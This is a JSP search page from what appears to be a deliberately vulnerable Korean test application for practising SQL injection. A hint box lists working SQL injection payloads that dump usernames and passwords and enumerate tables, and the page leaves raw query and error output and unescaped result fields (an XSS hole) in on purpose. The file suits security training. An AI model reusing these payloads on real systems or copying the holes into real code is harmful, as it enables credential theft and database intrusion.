<%@ page contentType="text/html;charset=UTF-8" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>문서 검색 - SQLi 테스트</title>
  <style>
    body { font-family: 'Malgun Gothic', sans-serif; margin: 0; background: #f4f6f9; }
    .header { background: #003366; color: #fff; padding: 12px 30px; }
    .header a { color: #aad4ff; text-decoration: none; margin-right: 10px; font-size: 13px; }
    .container { max-width: 960px; margin: 24px auto; padding: 0 20px; }
    .card { background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 20px; margin-bottom: 16px; }
    h2 { color: #003366; margin-top: 0; }
    .search-box { display: flex; gap: 10px; margin-bottom: 16px; }
    .search-box input { flex: 1; padding: 10px; border: 1px solid #bbb; border-radius: 4px; font-size: 14px; }
    .search-box button { padding: 10px 20px; background: #003366; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
    .query-box { background: #1e1e1e; color: #4ec9b0; padding: 12px; border-radius: 4px; font-family: monospace; font-size: 12px; margin-bottom: 12px; }
    .error-box { background: #fff0f0; border: 1px solid #ffaaaa; color: #cc0000; padding: 12px; border-radius: 4px; font-family: monospace; font-size: 12px; margin-bottom: 12px; }
    table { width: 100%; border-collapse: collapse; font-size: 13px; }
    th { background: #003366; color: #fff; padding: 10px; text-align: left; }
    td { padding: 10px; border-bottom: 1px solid #eee; }
    tr:hover td { background: #f0f4ff; }
    .hint { background: #fff8e1; border-left: 3px solid #ffc107; padding: 10px 14px; font-size: 12px; margin-bottom: 12px; }
    .tag { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 11px; font-weight: bold; }
    .tag-sqli { background: #ffe0e0; color: #c00; }
  </style>
</head>
<body>
<div class="header">
  <a href="/nas/main/main.do">← 홈</a>
  <strong style="font-size:16px;">문서 키워드 검색</strong>
  <span class="tag tag-sqli" style="margin-left:10px;">SQLi-1: LIKE 절 인젝션</span>
</div>

<div class="container">
  <div class="card">
    <h2>기록물 통합 검색</h2>
    <form method="GET" action="/nas/search/search.do">
      <div class="search-box">
        <input type="text" name="keyword" value="${keyword}" placeholder="검색어를 입력하세요 (취약 파라미터)">
        <button type="submit">검색</button>
      </div>
      <input type="hidden" name="extendedParam" value="sitdId=nas">
    </form>

    <div class="hint">
      💡 <strong>SQLi 테스트 페이로드:</strong><br>
      <code>' OR '1'='1</code> — 전체 조회<br>
      <code>' UNION SELECT username,password,role,email,id FROM users-- </code> — 사용자 정보 탈취<br>
      <code>' AND 1=2 UNION SELECT table_name,table_schema,null,null,null FROM information_schema.tables-- </code> — 테이블 열거
    </div>

    <% if (request.getAttribute("executedQuery") != null) { %>
    <div class="query-box">
      🔍 실행된 쿼리: <%= request.getAttribute("executedQuery") %>
    </div>
    <% } %>

    <% if (request.getAttribute("errorMsg") != null) { %>
    <div class="error-box">
      ⚠️ DB 오류 (취약점 확인): <%= request.getAttribute("errorMsg") %>
    </div>
    <% } %>

    <c:if test="${not empty results}">
      <table>
        <thead>
          <tr><th>ID</th><th>제목</th><th>내용</th><th>작성자</th><th>분류</th></tr>
        </thead>
        <tbody>
          <c:forEach var="row" items="${results}">
            <tr>
              <td>${row.ID}</td>
              <%-- ★ 취약: c:out 미사용 → XSS도 발생 --%>
              <td>${row.TITLE}</td>
              <td>${row.CONTENT}</td>
              <td>${row.AUTHOR}</td>
              <td>${row.CATEGORY}</td>
            </tr>
          </c:forEach>
        </tbody>
      </table>
      <p style="font-size:12px;color:#666;margin-top:8px;">총 ${results.size()}건 조회</p>
    </c:if>

    <c:if test="${empty results and not empty keyword}">
      <p style="color:#999;font-size:13px;">검색 결과가 없습니다.</p>
    </c:if>
  </div>
</div>
</body>
</html>
